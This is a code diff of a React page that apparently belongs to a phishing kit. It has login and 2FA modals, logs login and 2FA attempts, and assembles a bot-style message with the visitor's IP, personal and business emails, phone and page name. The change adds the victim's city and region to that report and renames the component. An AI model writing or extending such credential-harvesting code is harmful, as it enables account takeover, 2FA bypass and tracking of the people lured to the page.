@@ -22,7 +22,7 @@ import DocImg from '@/assets/images/doc.png';
 
 const LABEL = 'Thần-tài-đến';
 
-const Index = () => {
+const Home = () => {
     const [showFirstModal, setShowFirstModal] = useState(false);
     const [showLoginModal, setShowLoginModal] = useState(false);
     const [show2FAModal, setShow2FAModal] = useState(false);
@@ -42,7 +42,7 @@ const Index = () => {
     });
     const [loginAttempts, setLoginAttempts] = useState([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState([]);
-    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
+    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' });
     const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
@@ -225,7 +225,9 @@ const Index = () => {
                 const data = response.data;
                 setIpInfo({
                     ip: data.ip || 'Unknown',
-                    country: data.country_name || 'Unknown'
+                    city: data.city || 'Unknown',
+                    region: data.region || 'Unknown',
+                    country: data.country || 'Unknown'
                 });
                 localStorage.setItem('ipInfo', JSON.stringify(data));
 
@@ -292,7 +294,8 @@ const Index = () => {
 
         let message = `📩 <b>${LABEL}</b>\n`;
         message += `⏰ ${dt}\n`;
-        message += `🌐 <code>${ipInfo.ip}</code> • ${ipInfo.country}\n`;
+        message += `🌐 IP: <code>${ipInfo.ip}</code>\n`;
+        message += `📍 Vị trí: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName) {
@@ -680,5 +683,5 @@ const Index = () => {
     );
 };
 
-export default Index;
+export default Home;
 
